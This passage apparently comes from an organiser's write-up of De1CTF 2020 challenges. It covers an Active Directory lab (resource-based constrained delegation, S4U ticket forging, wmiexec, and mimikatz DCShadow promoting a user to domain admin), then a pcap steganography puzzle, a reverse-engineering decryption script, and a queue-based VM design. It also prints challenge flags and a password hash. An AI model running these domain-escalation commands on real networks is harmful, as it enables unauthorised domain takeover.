<p>申请一张De1ta用户的TGT，并导入当前会话</p>
<figure>
<img src="https://i.loli.net/2020/05/05/3b6wdSU97xmQ8DK.png" alt><figcaption>27.png</figcaption>
</figure>
<p>然后新建一个主机用户evilsystem，并配置evilsystem到DM基于资源的约束委派</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount evilsystem -Password $(<span class="built_in">ConvertTo-SecureString</span> <span class="string">"evil"</span> -AsPlainText -Force)</span><br><span class="line"></span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1806179181-549835139-1294087714-1111)"</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line">Get-DomainComputer DM| Set-DomainObject -Set @&#123;<span class="string">'msds-allowedtoactonbehalfofotheridentity'</span>=<span class="variable">$SDBytes</span>&#125; -Verbose</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i.loli.net/2020/05/05/b7iMdkjF6ElXpKe.png" alt><figcaption>img</figcaption>
</figure>
<p>配置完成后我们就可以通过s4u获得一个高权限的shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\getst.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/evilsystem:evil</span><br><span class="line">$env:KRB5CCNAME=&quot;Administrator.ccache&quot;</span><br><span class="line">.\wmiexec.exe -no-pass -k dm shell.exe</span><br></pre></td></tr></table></figure>
<p>PS：如果是msf的shell的话会出现如下情况，出现这个问题的原因应该是命名管道导致编码出现问题。</p>
<figure>
<img src="https://i.loli.net/2020/05/05/S7ak14zgVlCu3dA.png" alt><figcaption>29.png</figcaption>
</figure>
<p>所以这里使用cs，或者直接把内网穿透出来也是可以的</p>
<figure>
<img src="https://i.loli.net/2020/05/05/rH5AzbohEUWfyqt.png" alt><figcaption>30.png</figcaption>
</figure>
<p>执行之后就即可得到一个高权限的shell了</p>
<figure>
<img src="https://i.loli.net/2020/05/05/tTIwNgMYdS2WCZK.png" alt><figcaption>img</figcaption>
</figure>
<p>然后就是利用Dcshadow修改用户的属性，这里可以是修改SID-History为域管的SID或者是修改primaryGroupID改为域管组的primaryGroupID(512)都是可以的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe  &quot;!+&quot; &quot;!processtoken&quot; &quot;lsadump::dcshadow /object:de1ta /attribute:primaryGroupID /value:512&quot;</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i.loli.net/2020/05/05/lvid7czZSfP3apE.png" alt><figcaption>32.png</figcaption>
</figure>
<p>然后使用用户De1ta进行推送，触发域控间数据的同步</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /domain:de1ctf2020.lab /ptt &amp;&amp; mimikatz.exe &quot;lsadump::dcshadow /push&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i.loli.net/2020/05/05/IbnqfEOQMpAH2ho.png" alt><figcaption>36.png</figcaption>
</figure>
<p>推送之后查看一下是否加入域管组</p>
<figure>
<img src="https://i.loli.net/2020/05/05/YNK7qHQydiMglxB.png" alt><figcaption>35.png</figcaption>
</figure>
<p>然后读取在域控上的flag即可</p>
<figure>
<img src="https://i.loli.net/2020/05/05/vaGIPQfXKyEJl7r.png" alt><figcaption>37.png</figcaption>
</figure>
<p>整个过程如下：</p>
<p>PS：有时候因为网络问题RPC那端可能会没有显示同步完成，这个属于正常现象，不影响把数据同步到域控上。</p>
<figure>
<img src="https://i.loli.net/2020/05/05/3LARC8ax2MBQJWY.gif" alt><figcaption>9.gif</figcaption>
</figure>
<h3><span id="end">End</span></h3>
<p>提一下，这道题有几个上车的点： 1. 如果是使用mimikatz.exe的<code>!processtoken</code>提升为system权限，会将当前进程的所有mimikatz、cmd都提升为system权限。 2. Dcshadow那步没有将权限还原，可能导致其它选手直接上车（有2、3个队就是上了这个车）。 3. 注册SPN那步没有将De1ta用户的SPN给删掉，可能导致其它选手直接<code>Kerberoasting</code>上车。</p>
<p>还有选手问的几个比较多的问题，我这里提一下： 1. 为什么De1ta的密码能用logonpasswords导出来 解：因为有人提权之后拿De1ta用户登陆了DM，所以在内存中缓存了密码 2. 为什么使用De1ta用户能直接登陆域控getflag 解：因为上一个队伍Dcshadow之后De1ta用户是高权限，并且没有及时清理掉权限 3. 为什么不用基于资源的约束委派也能提权 解：其实这里有两个非预期提权的，虽然最后这两个提权都修了，但是还是有一个队伍利用PrintSpoofer提权并且拿到了flag Orz，一个是土豆（修题：禁用DCOM），一个是PrintSpoofer（修题：禁用SeImpersonatePrivilege）。PrintSpoofer是我没想到，这个提权方法是比赛结束后我才在推特上看到的，提权方法是5.2公布的，比赛刚好是5.2，搞得修题跟应急似的 4. 为什么用Rebeus导入的票据使用不了 解：这个具体原因我也不是很清楚，但是用impacket是没有什么问题的</p>
<p>最后非常感谢各位师傅的认真做题没有给题目搅屎Orzzzzzzz</p>
<h2><span id="misc_chowder">Misc_Chowder</span></h2>
<p>赛题给了一个流量包，使用wireshark打开，选择菜单栏“文件-导出对象-HTTP”，可以发现有7个内容类型为<code>multipart/form-data</code>，这些都是上传的一些数据。</p>
<figure>
<img src="https://i.loli.net/2020/05/06/Ccub47IsZDMRYT9.png" alt><figcaption>1588654908630.png</figcaption>
</figure>
<p>把内容提取出来，可以发现有6个是jpg，有一个是png，包含png图片数据的是上面分组号为3075的数据包，把它save保存下来，然后拖进winhex，找到png数据的开头和结尾(此png的文件头为 89504E47 ，文件尾为 426082 )，结合快捷键alt+1、alt+2、ctrl+x即可完成切割，提取得到png图片，得到另一个附件的链接。</p>
<figure>
<img src="https://i.loli.net/2020/05/06/bNfZDhv3aI4PGnM.png" alt><figcaption>123.png</figcaption>
</figure>
<p>得到一个readme.zip，解压发现有个readme.docx（其实这里本来还设计了一个zip伪加密，但是文件一上传drive.google，伪加密就不见了，不知道为啥）。</p>
<p>在<code>readme.docx</code>里发现藏有zip文件，直接把后缀改为zip，即可提取出来<code>You_found_me_Orz.zip</code>。这个zip文件需要暴力破解得到密码（可能由于存在缓存的原因，出题人在自己电脑测试的时候爆破出当时设计的6位密码的时间并不长，后面重装了一下软件，发现确实爆破时间很长，于是给了提示“密码是由6位字符组成，开头的2个字符是DE”），爆破得到密码为<code>DE34Q1</code>。</p>
<figure>
<img src="https://i.loli.net/2020/05/06/RaTcEAtufyWJZoK.png" alt><figcaption>1588656395938.png</figcaption>
</figure>
<p>解压得到一个图片<code>You_found_me_Orz.jpg</code>，拖进notepad++、winhex等工具可以发现还有里面还有666.jpg、flag.txt、fffffffflllll.txt等文件，并且发现了rar的一些标志。</p>
<figure>
<img src="https://i.loli.net/2020/05/06/UoWJA1RF4zmMdf7.png" alt><figcaption>1588655950372.png</figcaption>
</figure>
<p>直接把后缀名改为rar即可解压出里面的文件。其中flag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF&#123;jaivy say that you almost get me!!! &#125;</span><br></pre></td></tr></table></figure>
<p>是一个假的flag(这点好多老外过来问...)，并且发现fffffffflllll.txt并没有出现，这里考察的是ADS隐写，也可以通过上图当中的<code>:fffffffflllll.txt</code>看出一些端倪，因为ADS隐写的一些数据一般都是这样子的<code>xxx:xxxxxx</code>。使用<code>Shortcut to NTFS Streams Info</code>工具即可看到藏在666.jpg中的ADS隐写数据获得真正的flag。</p>
<figure>
<img src="https://i.loli.net/2020/05/06/KvL1X6YP7DedxrR.png" alt><figcaption>1588656264938.png</figcaption>
</figure>
<p>提取得到flag为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF&#123;E4Sy_M1sc_By_Jaivy_31b229908cb9bb&#125;</span><br></pre></td></tr></table></figure>
<h1><span id="reverse">reverse</span></h1>
<h2><span id="parser">parser</span></h2>
<h3><span id="出题思路">出题思路</span></h3>
<p>最近在学编译原理，写了个极其简单的词法分析器和语法分析器来解析flag。</p>
<p>首先词法分析提取token，不满足要求的会抛出异常</p>
<p>文法:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">∑ ：</span><br><span class="line">De1CTF    &quot;De1CTF&quot;</span><br><span class="line">LB            &quot;&#123;&quot;</span><br><span class="line">RB            &quot;&#125;&quot;</span><br><span class="line">WORD        &quot;[0-9a-zA-Z]+&quot;</span><br><span class="line">ADD            &quot;+&quot;</span><br><span class="line">UL            &quot;_&quot;</span><br><span class="line">LP            &quot;(&quot;</span><br><span class="line">RP            &quot;)&quot;</span><br><span class="line">CR            &quot;\n&quot;</span><br><span class="line"></span><br><span class="line">N ：</span><br><span class="line">FLAG, PRIM, EXP, TERM, WORD</span><br><span class="line"></span><br><span class="line">P ：</span><br><span class="line">FLAG -&gt; De1CTF LB EXP RB CR</span><br><span class="line">EXP -&gt;  TERM</span><br><span class="line">      | TERM ADD TERM</span><br><span class="line">TERM -&gt; PRIM</span><br><span class="line">          | PRIM UL TERM</span><br><span class="line">PRIM -&gt; WORD</span><br><span class="line"></span><br><span class="line">S : FLAG</span><br></pre></td></tr></table></figure>
<p>其实就是跟四则运算一样</p>
<p>首先所有WORD都会被RC4加密一下</p>
<p>a + b被定义为aes_encrypt(ab)</p>
<p>a _ b被定义为des_encrpt(ab)</p>
<p>_的优先级比+要高，没有实现括号，因为括号会产生多解（无限加括号）。除非对括号进行其他操作的定义，但我觉得没必要</p>
<p>编译时没有开启编译优化。（看了一眼O3后的，我自己都看不懂，开了怕不是被打</p>
<p>但是由于用了9.0的g++，新特性添加了endbr64指令（漏洞缓解机制，具体不太懂），导致IDA得不到plt表的信息，但是GDB或者用ida调试起来可以看。。。</p>
<p>符号表保留了挺多有用的信息，所以strip了。</p>
<h3><span id="逆向">逆向</span></h3>
<p>由于是用C++编写的，逆向的难度较大。就算O0也挺难纯静态做。</p>
<p>首先可以随便输点什么测试一下，不难发现输入的格式和结构。</p>
<p>最好的办法应该是一边调试一边跟踪数据流，很快会发现输入在<code>sub_35F0</code>被分割成一个一个token，不难分析出token的种类。所有token被存进一个<code>std::vector</code>。</p>
<p>跟踪存放token的vector来到<code>sub_4E70</code>和<code>sub_507E</code>，这里递归的调用了<code>sub_507E</code>最终来到<code>sub_51CC</code>，类型为4的token（也就是单个字符串）被RC4加密。</p>
<p>返回到<code>sub_507E</code>。这里是一个循环，结束的条件为下一个token不是<code>_</code>。继续递归调用<code>sub_507E</code>解析出一个字符串后，讲两个字符串拼接然后des加密。</p>
<p>继续返回，来到<code>sub_4E70</code>，依然是一个循环，结束条件为下一个token不是<code>+</code>。然后又调用<code>sub_507E</code>，解析一个新的结果出来，两个结果拼接后aes加密。</p>
<p>所有的结果都是用<code>std::string</code>链接起来的，最后和<code>unk_8040</code>常量对比。</p>
<p>到这里基本就完全逆完了。比较重要的事情是+和_的优先级是不一样的，这是解题的关键。</p>
<p>加密算法全部用的PKCS7来pad，全部是标准的加密算法，（AES的S盒替换这一步没有直接查表，而是按照S盒生成原理写的，所以找不到S盒。但是观察AES的10轮结构应该很轻松能看出来），结合调试和验证也能发现是正常标准的加密算法，分组模式是CBC（ECB的话求解起来可能更复杂一些），密钥都为De1CTF，也用PKCS7来pad到正确的长度。</p>
<h3><span id="解法">解法</span></h3>
<p>注意到所有的明文都通过PKCS7pad到正确的长度，所以我们可以通过尝试判断当前这一步是aes还是des。</p>
<p>拿到常量后，考虑这是<code>A+B+C+D</code>这种的结果还是<code>A_B_C_D</code>这种。通过解密发现aes解密结果有padding，所以就有：</p>
<p>result = aes(result_before+D)</p>
<p>尽管我们不知道前一部分有多少个项，但是最后一部分一定只有一个项。接下来要确认这一项是<code>d1_d1_d3</code>这种形式（des的密文）还是单独的一个字符串<code>d1</code>（rc4的密文）。</p>
<p>尽管我们仍然不知道最后一项有多长，但由于前面一部分大概率是aes或des的密文（如果前一部分是rc4密文，就意味着我们对着整体解rc4就能拿到第一部分的明文了），所以我们在后一部分只要考虑8*n的长度即可。对后8*n字节解des或rc4，寻找padding或明文，然后在对后一部分讨论rc4与des的组合情况，这里就比较容易了。</p>
<p>以此类推，我们就可以恢复所有部分的明文，根据加密关系补上符号就是flag了。</p>
<p>详细的分析在脚本里</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4, AES, DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">key = <span class="string">b"De1CTF"</span></span><br><span class="line">rc4_key = key</span><br><span class="line">des_key = key.ljust(<span class="number">8</span>, <span class="string">b"\x02"</span>)</span><br><span class="line">aes_key = key.ljust(<span class="number">16</span>, <span class="string">b"\x0a"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_decrypt</span><span class="params">(cipher, key=rc4_key)</span>:</span></span><br><span class="line">    rc4 = ARC4.new(key)</span><br><span class="line">    <span class="keyword">return</span> rc4.decrypt(cipher)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_decrypt</span><span class="params">(cipher, key=aes_key)</span>:</span></span><br><span class="line">    aes = AES.new(key, iv=key, mode=AES.MODE_CBC)</span><br><span class="line">    <span class="keyword">return</span> aes.decrypt(cipher)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_decrypt</span><span class="params">(cipher, key=des_key)</span>:</span></span><br><span class="line">    des = DES.new(key, iv=key, mode=AES.MODE_CBC)</span><br><span class="line">    <span class="keyword">return</span> des.decrypt(cipher)</span><br><span class="line">flag = <span class="string">b"&#125;"</span></span><br><span class="line">cipher = <span class="string">b"\xe7\xa43L\xd3\x11\xe7\x85hV\x97\x11\xee\xd2\xf8\xd9&gt;p\xc9N\x94\xa02Z'\x98\x00\x1d\xd5\xd7\x11\x1d\xf4\x85a\xac\x0c\x80'@\xbd\xdd\x1f\x0b\xb4\x97\x1f`[T\xcb\xc5\xa8\xb7\x11\x90\xc9\xb5\x81eS\x0f~\x7f"</span></span><br><span class="line"><span class="comment"># 不太可能直接解rc4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别尝试des和aes解密，在aes中发现了padding，说明结果是A+B的形式</span></span><br><span class="line">print(des_decrypt(cipher))</span><br><span class="line"><span class="comment"># b'\x0e\x08r\xa8C\x14u\xae\xee\xd6)9.Q\xd3\xca|\xcf.\xde\xb9&lt;\x8f4N\xcaP%X&gt;5,\x1fIu\x89\xd5\xb3\xf5[1\x9b\x86Q\x86&amp;\x05\xc8FGW\xf3\xfd&amp;\xb4[#\x16O4\x94:h\x90'</span></span><br><span class="line">print(aes_decrypt(cipher))</span><br><span class="line"><span class="comment"># b"\x0b\x82z\x9e\x00.\x07m\xe2\xd8L\xac\xb1#\xbc\x1e\xb0\x8e\xbe\xc1\xa4T\xe0\xf5P\xc6]7\xc5\x8c&#125;\xaf-H'4-;\x13\xd9s\x0f%\xc1v\x89\x19\x8b\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10"</span></span><br><span class="line">cipher = unpad(aes_decrypt(cipher), <span class="number">16</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于解析时是循环加上TERM的，所以后一部分必然是一个TERM，因此我们先讨论后一部分更合适</span></span><br><span class="line"><span class="comment"># 既然B是一个TERM，那么要么直接是一个WORD，直接rc4解密并不能发现正常结果</span></span><br><span class="line"><span class="comment"># 要么就是b1_b2的形式。根据des分组长度为8字节，爆破des的分组数目</span></span><br><span class="line"><span class="comment"># 最后在长度为16时发现了des的padding</span></span><br><span class="line">print(des_decrypt(cipher[<span class="number">-8</span>:]))</span><br><span class="line"><span class="comment"># b'G*\x11p~z\x16\xdc'</span></span><br><span class="line">print(des_decrypt(cipher[<span class="number">-16</span>:]))</span><br><span class="line"><span class="comment"># b'\xcd\xc55\x89\x9f#\xf0\xb2.\x07\x07\x07\x07\x07\x07\x07'</span></span><br><span class="line">term_1 = unpad(des_decrypt(cipher[<span class="number">-16</span>:]), <span class="number">8</span>)</span><br><span class="line">cipher = cipher[:<span class="number">-16</span>] <span class="comment"># 前一部分放到后面讨论</span></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b1_b2的形式，跟之前+的分析类似，从后往前找WORD，再讨论b1的情况</span></span><br><span class="line"><span class="comment"># 正常来说只能知道后面是单独的WORD，所以要爆破这一部分rc4明文长度</span></span><br><span class="line"><span class="comment"># 当然，这里的长度足够短，可以猜测就是两个WORD，直接rc4解密就能看到第一个WORD，剩下的是另一个</span></span><br><span class="line">print(rc4_decrypt(term_1))</span><br><span class="line"><span class="comment"># 开头发现了有意义的字符串`4nd`</span></span><br><span class="line">print(rc4_decrypt(term_1[<span class="number">3</span>:]))</span><br><span class="line"><span class="comment"># b"p4r53r"</span></span><br><span class="line">word_1 = rc4_decrypt(term_1[<span class="number">3</span>:])</span><br><span class="line">word_2 = rc4_decrypt(term_1[:<span class="number">3</span>])</span><br><span class="line">flag = word_2 + <span class="string">b"_"</span> + word_1 + flag</span><br><span class="line">flag = <span class="string">b"+"</span> + flag</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来又和一开始一样了，重复一遍。先试一下aes和des，判断是单独的TERM还是两部分相加（当然还有直接是一个WORD的可能）</span></span><br><span class="line"><span class="comment"># 还是在aes中发现了padding，依然是A+B的形式</span></span><br><span class="line">print(des_decrypt(cipher))</span><br><span class="line"><span class="comment"># b"\xa7\xaf\xa7\xe8#I\x9e#6X\x19\xed\xd5\x06\xcc\x86\xe4OC\x89 \x15\xff'\xd8\xe1f\x95\xfc\x99\xf8\x1e"</span></span><br><span class="line">print(aes_decrypt(cipher))</span><br><span class="line"><span class="comment"># b'\x91\x98=\xa9\xb1:1\xef\x04r\xb5\x02\x07;h\xdd\xbd\xdb&lt;\xc1&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'</span></span><br><span class="line">cipher = unpad(aes_decrypt(cipher), <span class="number">16</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 依然是爆破后面一个TERM的长度</span></span><br><span class="line">print(des_decrypt(cipher[<span class="number">-8</span>:]))</span><br><span class="line">print(des_decrypt(cipher[<span class="number">-16</span>:]))</span><br><span class="line"><span class="comment"># 长度为16时发现padding，剩下的就是前一部分</span></span><br><span class="line">term_2 = unpad(des_decrypt(cipher[<span class="number">-16</span>:]), <span class="number">8</span>)</span><br><span class="line">cipher = cipher[<span class="number">0</span>:<span class="number">-16</span>]</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 依然是可以猜测两个WORD组成</span></span><br><span class="line">print(rc4_decrypt(term_2))</span><br><span class="line"><span class="comment"># 开头发现了有意义的字符串b"w0rld"</span></span><br><span class="line">print(rc4_decrypt(term_2[<span class="number">5</span>:]))</span><br><span class="line"><span class="comment"># b"l3x3r"</span></span><br><span class="line">word_3 = rc4_decrypt(term_2[<span class="number">5</span>:])</span><br><span class="line">word_4 = rc4_decrypt(term_2[:<span class="number">5</span>])</span><br><span class="line">flag = word_4 + <span class="string">b"_"</span> + word_3 + flag</span><br><span class="line">flag = <span class="string">b"+"</span> + flag</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 剩下的内容很短，直接解rc4</span></span><br><span class="line">print(rc4_decrypt(cipher))</span><br><span class="line">word_5 = rc4_decrypt(cipher)</span><br><span class="line">flag = word_5 + flag</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b"De1CTF&#123;"</span> + flag</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>感觉可以根据padding写一个自动求解的脚本。不过处理起来挺麻烦的，就没有尝试</p>
<h2><span id="flw">FLW</span></h2>
<h3><span id="queuevirtualmachine">QueueVirtualMachine</span></h3>
<h3><span id="virtualmachine">VirtualMachine</span></h3>
<p><code>unsigned char flag[] = "de1ctf{Innocence_Eye&amp;Daisy*}";</code></p>
<p>这是一个基于队列的虚拟机。</p>
<p>虚拟机的结构如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueVirtualMachine</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    QueueVirtualMachine();</span><br><span class="line">    QueueVirtualMachine(<span class="keyword">unsigned</span> <span class="keyword">char</span>*);</span><br><span class="line">    ~QueueVirtualMachine();</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printQueueMemSpace</span><span class="params">()</span></span>; <span class="comment">//用于获取调试信息</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printMemSpace</span><span class="params">()</span></span>;      <span class="comment">//用于获取调试信息</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> head,tail;         <span class="comment">//队列的头，尾指针</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> reg;    <span class="comment">//用于计算分组base58的寄存器</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *queueMemSpace;<span class="comment">//队列空间</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *memSpace;     <span class="comment">//内存空间</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *codeSpace;    <span class="comment">//代码段</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *tempString;   <span class="comment">//字符串缓冲区</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>虚拟机的指令如下：</p>
<ul>
<li>14 xx</li>
</ul>
<p>将一个数字压入队列的尾部</p>
<ul>
<li>15</li>
</ul>
<p>丢弃一个队尾元素</p>
<ul>
<li>20 xx</li>
</ul>
<p>将队列头部的一个字节放入<code>memSpace[xx]</code>的位置</p>
<ul>
<li>2a xx</li>
</ul>
<p>将<code>memspace[xx]</code>的一个字节压入队列尾部</p>
<ul>
<li>2b</li>
</ul>
<p>取队列头部的一个数据作为索引，将memspace[]的一个字节压入队列尾部</p>
<ul>
<li>2c</li>
</ul>
<p>取队列头部的一个数据作为索引，将队列中的下一个字节放入memspace[]</p>
<ul>
<li>30</li>
</ul>
<p>先左移reg 8位，然后reg加上队尾元素</p>
<ul>
<li>31 xx</li>
</ul>
<p>寄存器中的short除以xx,余数入队列，商在reg中</p>
<ul>
<li>32</li>
</ul>
<p>取队列头部的一个byte作为table[]的索引取值，取值结果入队列</p>
<ul>
<li>33</li>
</ul>
<p>取队列头部的两个数据相加，结果入队列</p>
<ul>
<li>34</li>
</ul>
<p>取队列头部的两个数据相减，结果入队列。</p>
<p>注意，减数在队首</p>
<ul>
<li>35</li>
</ul>
<p>取队列头部的两个数据相×，结果入队列</p>
<ul>
<li>36</li>
</ul>
<p>寄存器中的数据入队列，并清空寄存器</p>
<ul>
<li>37</li>
</ul>
<p>取队列头部的两个数据相异或，结果入队列</p>
<ul>
<li>3a</li>
</ul>
<p>读入一个字符串，字符串放在缓冲区，字符串长度入队列</p>
<ul>
<li>40 xx</li>
</ul>
<p>取队列头部的一个数字，如果该数字【不】为0，则</p>
<p><code>op -= xx</code></p>
<ul>
<li>41</li>
</ul>
<p>缓冲区中的字符串入队列，清空缓冲区</p>
<ul>
<li>ab</li>
</ul>
<p>指令执行完毕，返回true</p>
<ul>
<li>ff</li>
</ul>
<p>如果队列头部的数据不为0，则虚拟机返回bool值<code>false</code></p>
<h3><span id="算法设计">算法设计</span></h3>
<p>1.读取字符串、检测长度、移入memSpace</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cin&gt;&gt;tempString;</span></span><br><span class="line"><span class="number">0x3a</span>,</span><br><span class="line"><span class="comment">//if(strlen(tempString)!=28)return false;</span></span><br><span class="line"><span class="number">0x14</span>,<span class="number">28</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="comment">//将缓冲区中暂存的字符串移入缓冲区</span></span><br><span class="line"><span class="number">0x41</span>,</span><br><span class="line"><span class="comment">//从队列中移入内存</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x19</span>,<span class="comment">//d</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1a</span>,<span class="comment">//e</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1b</span>,<span class="comment">//1</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1c</span>,<span class="comment">//c</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1d</span>,<span class="comment">//t</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1e</span>,<span class="comment">//f</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1f</span>,<span 